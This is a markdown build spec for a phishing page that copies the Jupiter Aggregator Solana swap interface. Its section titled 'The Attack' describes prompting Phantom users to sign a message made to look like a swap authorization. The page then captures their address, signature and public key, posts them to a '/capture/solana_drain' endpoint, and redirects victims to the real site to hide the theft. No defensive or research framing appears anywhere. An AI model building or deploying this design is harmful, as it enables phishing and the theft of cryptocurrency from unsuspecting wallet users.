# Jupiter Clone — Full HTML Template

Pixel-perfect Jupiter Aggregator clone with Phantom signMessage capture.

## Key Sections

### Header
- Dark theme (#0d0d0d), purple gradient accent (#6f42c1 → #d66ef4)
- "Solana Mainnet" network badge
- "Connect Wallet" button with gradient

### Swap Card
- Dark card (#1a1a1a) with subtle border (#2a2a2a)
- Route info showing "SOL → USDC via Orca"
- Slippage: 0.5%, Network fee display

### Wallet Connection
- Detects `window.solana` (Phantom)
- On connect: captures Solana address via `window.solana.connect()`
- Fetches SOL balance via RPC
- Shows connected state with truncated address

### Signature Request (The Attack)
When user clicks "Approve Swap":
1. Creates a text message that looks like a swap authorization
2. Requests `window.solana.signMessage(message, 'utf8')`
3. Captures: address + signature (base64) + publicKey
4. The signed message can be used to authorize token transfers
5. Sends to: POST /capture/solana_drain
6. Redirects to real Jupiter after 3 seconds

### Auto-Detection
- Detects Phantom on page load
- Listens for `window.solana.on('connect', ...)` events
- If no Phantom detected, prompts to install from phantom.app

## Required Endpoint

```
POST /capture/solana_drain
Body: {"address": "sol123...", "signature": "base64sig", "publicKey": "sol...", "provider": "Phantom"}
Response: {"status": "ok", "txid": "submitted"}
```

## Reference

- Phantom wallet adapter: https://docs.phantom.app/
- Jupiter interface: https://jup.ag
